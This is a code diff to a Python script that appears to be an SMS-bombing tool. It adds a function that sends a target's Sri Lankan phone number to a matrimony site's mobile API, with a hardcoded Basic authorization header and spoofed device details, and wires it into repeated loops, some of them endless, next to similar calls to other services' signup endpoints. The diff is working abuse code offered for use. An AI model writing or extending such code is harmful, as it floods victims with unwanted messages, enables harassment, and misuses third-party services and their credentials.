@@ -95,6 +95,12 @@ if cho==1:
 		body={'phone':num,'course':'1','sesskey':'','action':'sms_reg'}
 		poreq=post(url,data=body)
 		time.sleep(delay)
+	def slmat(num,delay):
+		url='https://www.srilankanmatrimony.com/api/1/6'
+		headers={'Authorization':'Basic YWRtaW46bFJxVzZXTlQ=','Content-Type':'application/x-www-form-urlencoded','Host':'www.srilankanmatrimony.com'}
+		data={'Module':'','MatriId':'LKA841313','PackageName':'com.srilankanmatrimony','AppVersionCode':'148','SignalStrength':'','AppVersion':'6.0','EncryptId':'58ceb12be79bde7e7a1b8ca366823fad099ba147','Referrer':'Page3','NetworkType':'WIFI','UniqueId':'','mima':'yes','DeviceVersion':'5.1','DeviceModel':'HUAWEI%20LUA-U22','contactdet':f'%7B%22PriMobileCountryCode%22%3A%22%2B94%22%2C%22PriMobileNo%22%3A%22{num[1:]}%22%2C%22MatriId%22%3A%22LKA841313%22%7D','DevicePlatform':'Android','OutputType':'2','CommunityId':'2007','AppType':'102','CarrierName':'','Gender':'1'}
+		poreq=post(url,headers=headers,data=data)
+		time.sleep(delay)
 	def kangaroo(num,delay):
 		url='https://customer.kangarooapps.com/customer-api/customers/create'
 		body={'email':'a1@slt.net','firstName':'A','lastName':'b','password':'abcd1234','contactNumber':num[1:],'countryCode':'+94'}
@@ -279,6 +285,10 @@ if cho==1:
 																domin(num,delay)
 																count+=1
 																prsent(count,num)
+																if count< int(times):
+																	slmat(num,delay)
+																	count+=1
+																	prsent(count,num)
 		else:
 			while True:
 				mega(num,delay)
@@ -288,6 +298,9 @@ if cho==1:
 				count+=1
 				prsent(count,num)
 				guru(num,delay)
+				count+=1
+				prsent(count,num)
+				slmat(num,count)
 				count+=1
 				prsent(count,num)
 				kangaroo(num,delay)
@@ -372,6 +385,10 @@ if cho==1:
 																domin(num,delay)
 																count+=1
 																prsent(count,num)
+																if count< int(times):
+																	slmat(num,delay)
+																	count+=1
+																	prsent(count,num)
 		else:
 			while True:
 				dtamart(num,delay)
@@ -393,6 +410,9 @@ if cho==1:
 				count+=1
 				prsent(count,num)
 				flipkrt(num,delay)
+				count+=1
+				prsent(count,num)
+				slmat(num,count)
 				count+=1
 				prsent(count,num)
 				savari(num,delay)
@@ -468,6 +488,10 @@ if cho==1:
 																domin(num,delay)
 																count+=1
 																prsent(count,num)
+																if count< int(times):
+																	slmat(num,delay)
+																	count+=1
+																	prsent(count,num)
 		else:
 			while True:
 				hutcliq(num,delay)
@@ -480,6 +504,9 @@ if cho==1:
 				count+=1
 				prsent(count,num)
 				guru(num,delay)
+				count+=1
+				prsent(count,num)
+				slmat(num,count)
 				count+=1
 				prsent(count,num)
 				kangaroo(num,delay)
@@ -556,6 +583,10 @@ if cho==1:
 														domin(num,delay)
 														count+=1
 														prsent(count,num)
+														if count< int(times):
+																	slmat(num,delay)
+																	count+=1
+																	prsent(count,num)
 		else:
 			while True:
 				yogo(num,delay)
@@ -583,6 +614,9 @@ if cho==1:
 				count+=1
 				prsent(count,num)
 				oyoroom(num,delay)
+				count+=1
+				prsent(count,num)
+				slmat(num,count)
 				count+=1
 				prsent(count,num)
 				nanasa(num,delay)
